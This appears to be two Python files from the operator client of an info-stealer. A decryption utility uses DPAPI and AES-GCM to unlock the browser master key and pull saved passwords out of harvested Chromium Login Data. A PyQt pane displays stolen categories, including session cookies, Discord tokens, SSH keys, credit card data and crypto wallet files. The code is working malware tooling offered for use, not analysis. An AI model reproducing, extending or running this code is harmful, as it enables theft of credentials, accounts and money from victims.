# C2_Client/ui/decryption_util.py
import os
import json
import base64
import sqlite3
import zipfile
import tempfile
import io
import shutil
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    import win32crypt
    DPAPI_AVAILABLE = True
except ImportError:
    DPAPI_AVAILABLE = False

class Decryptor:
    def __init__(self, vault_data):
        self.vault_data = vault_data
        self.temp_dir = tempfile.TemporaryDirectory()

    def __del__(self):
        # The TemporaryDirectory object cleans itself up automatically when this object is destroyed
        self.temp_dir.cleanup()

    def _extract_files(self):
        browser_files_module = self.vault_data.get("Browser Files", {}).get("output", {})
        if not browser_files_module:
            return False, "Browser Files module data not found in the vault for this session."

        b64_zip_data = browser_files_module.get("data")
        if not isinstance(b64_zip_data, str):
            return False, "Browser file data is missing or not in the correct base64 string format."

        try:
            zip_bytes = base64.b64decode(b64_zip_data)
            with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
                zf.extractall(self.temp_dir.name)
            return True, "Files extracted successfully."
        except Exception as e:
            return False, f"Failed to decode or extract browser files from zip: {e}"

    def _get_master_key(self, browser_name):
        if not DPAPI_AVAILABLE:
            return None, "PyWin32 is not installed. Decryption is only possible on a Windows C2 machine."
        
        local_state_path = os.path.join(self.temp_dir.name, f"{browser_name}_Local_State")
        if not os.path.exists(local_state_path):
            return None, f"Local State file for {browser_name} not found in extracted files."
            
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
            encrypted_key_dpapi = base64.b64decode(encrypted_key_b64)
            master_key = win32crypt.CryptUnprotectData(encrypted_key_dpapi[5:], None, None, None, 0)[1]
            return master_key, None
        except Exception as e:
            return None, f"Failed to extract and decrypt master key for {browser_name}: {e}"

    def _decrypt_value(self, encrypted_value, master_key):
        if not master_key: return "NO_MASTER_KEY"
        if not encrypted_value: return ""
        try:
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                return AESGCM(master_key).decrypt(iv, payload, None).decode('utf-8')
            else:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        except Exception:
            return "DECRYPTION_FAILED"

    def decrypt_passwords(self):
        success, message = self._extract_files()
        if not success: return {"error": message}

        all_passwords = []
        browsers_found = list(set([f.split('_')[0] for f in os.listdir(self.temp_dir.name) if '_Login_Data' in f]))

        for browser in browsers_found:
            master_key, error = self._get_master_key(browser)
            if error:
                print(f"[DECRYPTION] Warning for {browser}: {error}")

            login_db_path = os.path.join(self.temp_dir.name, f"{browser}_Login_Data")
            if not os.path.exists(login_db_path): continue
            
            temp_db_path = os.path.join(self.temp_dir.name, f"temp_{browser}_db")
            shutil.copy2(login_db_path, temp_db_path)

            try:
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url, username, encrypted_pass = row
                    if not all([url, username, encrypted_pass]): continue
                    
                    password = self._decrypt_value(encrypted_pass, master_key)
                    if password and password not in ["NO_MASTER_KEY", "DECRYPTION_FAILED"]:
                        all_passwords.append({"Browser": browser, "URL": url, "Username": username, "Password": password})
                conn.close()
            except Exception as e:
                 print(f"[DECRYPTION] Failed to read password database for {browser}: {e}")
        
        return all_passwords```

#### **File: `C2_Client/ui/data_harvest_pane.py`**
This is the first tab in the session view. It contains the list of all harvested data categories and the tables/text views to display the results. It also has the "Decrypt" button that uses the utility above.

```python
# C2_Client/ui/data_harvest_pane.py
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QListWidget, QStackedWidget, 
                             QVBoxLayout, QTableWidget, QTextEdit, 
                             QHeaderView, QTableWidgetItem, QAbstractItemView, QPushButton)
from PyQt6.QtCore import pyqtSignal

class DataHarvestPane(QWidget):
    decryption_requested = pyqtSignal()

    def __init__(self):
        super().__init__()
        
        main_layout = QHBoxLayout(self)
        
        left_pane_widget = QWidget(); left_pane_layout = QVBoxLayout(left_pane_widget)
        left_pane_layout.setContentsMargins(0,0,0,0); left_pane_widget.setFixedWidth(240)

        self.category_list = QListWidget()
        
        self.categories = [
            "System Info", "Hardware Info", "Security Products", "Installed Applications", 
            "Running Processes", "Environment Variables", "Network Info", "Wi-Fi Passwords", 
            "Active Connections", "ARP Table", "DNS Cache", "Browser Passwords", 
            "Session Cookies", "Windows Vault Credentials", "Application Credentials", 
            "Discord Tokens", "Roblox Cookies", "SSH Keys", "Telegram Session Files", 
            "Credit Card Data", "Cryptocurrency Wallet Files", "Browser Autofill", 
            "Browser History", "Clipboard Contents", "Browser Files"
        ]
        self.category_list.addItems(self.categories)
        left_pane_layout.addWidget(self.category_list)

        self.decrypt_button = QPushButton("Decrypt Browser Data")
        self.decrypt_button.setObjectName("SanitizeButton")
        self.decrypt_button.clicked.connect(self.decryption_requested.emit)
        left_pane_layout.addWidget(self.decrypt_button)
        main_layout.addWidget(left_pane_widget)
        
        self.content_stack = QStackedWidget()
        main_layout.addWidget(self.content_stack, 1)
        
        self.view_map = {
            "System Info": self._create_text_view(), "Hardware Info": self._create_text_view(),
            "Security Products": self._create_text_view(), "Installed Applications": self._create_text_view(is_mono=True),
            "Running Processes": self._create_table(["PID", "Name", "Username"]), "Environment Variables": self._create_text_view(is_mono=True),
            "Network Info": self._create_text_view(), "Wi-Fi Passwords": self._create_table(["SSID", "Password"]),
            "Active Connections": self._create_text_view(is_mono=True), "ARP Table": self._create_text_view(is_mono=True),
            "DNS Cache": self._create_text_view(is_mono=True), "Browser Passwords": self._create_table(["Browser", "URL", "Username", "Password"]),
            "Session Cookies": self._create_table(["Host", "Name", "Expires (UTC)", "Value"]), "Windows Vault Credentials": self._create_table(["Resource", "Username", "Password"]),
            "Application Credentials": self._create_table(["Host", "Port", "Username", "Password"]), "Discord Tokens": self._create_text_view(is_mono=True),
            "Roblox Cookies": self._create_text_view(is_mono=True), "SSH Keys": self._create_text_view(is_mono=True),
            "Telegram Session Files": self._create_text_view(), "Credit Card Data": self._create_table(["Name on Card", "Expires (MM/YY)", "Card Number"]),
            "Cryptocurrency Wallet Files": self._create_text_view(is_mono=True), "Browser Autofill": self._create_table(["Field Name", "Value"]),
            "Browser History": self._create_table(["URL", "Title", "Visit Count", "Last Visit (UTC)"]), "Clipboard Contents": self._create_text_view(is_mono=True),
            "Browser Files": self._create_text_view()
        }
        
        self.ordered_keys = list(self.view_map.keys())
        for key in self.ordered_keys: self.content_stack.addWidget(self.view_map[key])

        self.category_list.currentItemChanged.connect(self.on_category_change)
        if self.category_list.count() > 0: self.category_list.setCurrentRow(0)

    def on_category_change(self, current_item):
        if not current_item: return
        index = self.category_list.row(current_item)
        if 0 <= index < len(self.ordered_keys):
            self.content_stack.setCurrentWidget(self.view_map[self.ordered_keys[index]])

    def _create_text_view(self, is_mono=False):
        text_edit = QTextEdit(); text_edit.setReadOnly(True)
        if is_mono: text_edit.setFontFamily("Consolas")
        return text_edit

    def _create_table(self, headers):
        table = QTableWidget(); table.setColumnCount(len(headers)); table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents); table.horizontalHeader().setStretchLastSection(True)
        table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers); table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        table.verticalHeader().setVisible(False); table.setSortingEnabled(True)
        return table

    def clear_all_views(self):
        for view in self.view_map.values():
            if isinstance(view, QTextEdit): view.setText("Awaiting data...")
            elif isinstance(view, QTableWidget): view.setRowCount(0)

    def update_view(self, module_name, data):
        view_key = module_name.replace(" (Raw)", "")
        view = self.view_map.get(view_key)
        if not view: return

        status = data.get("status", "success"); payload = data.get('data')
        if status == "error":
            if isinstance(view, QTextEdit): view.setText(f"Error harvesting this module:\n\n{payload}")
            return

        if view_key == "Browser Files":
            size_kb = len(payload.get("data", "")) / 1024 if payload else 0
            view.setText(f"Received browser data package.\n\nSize: {size_kb:.2f} KB\n\nClick 'Decrypt Browser Data' to process.")
            return

        if isinstance(view, QTextEdit): self._populate_text_view(view, payload)
        elif isinstance(view, QTableWidget): self._populate_table(view, payload)

    def _populate_text_view(self, view, data):
        if not data: view.setText("No data found."); return
        if isinstance(data, dict):
            html = "".join([f"<p><b>{key.replace('_', ' ').title()}:</b> {value}</p>" for key, value in data.items()])
            view.setHtml(html)
        elif isinstance(data, list): view.setText("\n".join(map(str, data)))
        else: view.setText(str(data))

    def _populate_table(self, table, data_list):
        table.setSortingEnabled(False)
        if not isinstance(data_list, list) or not data_list:
            table.setRowCount(0); table.setSortingEnabled(True); return
            
        table.setRowCount(len(data_list))
        header_map = {header.lower().replace(' ', '_'): i for i, header in enumerate([table.horizontalHeaderItem(j).text() for j in range(table.columnCount())])}
        
        for row_idx, row_data in enumerate(data_list):
            if isinstance(row_data, dict):
                normalized_data_keys = {k.lower().replace(' ', '_'): v for k, v in row_data.items()}
                for key, col_idx in header_map.items():
                    value = normalized_data_keys.get(key, '')
                    table.setItem(row_idx, col_idx, QTableWidgetItem(str(value)))
                    
        table.resizeColumnsToContents()
        table.setSortingEnabled(True)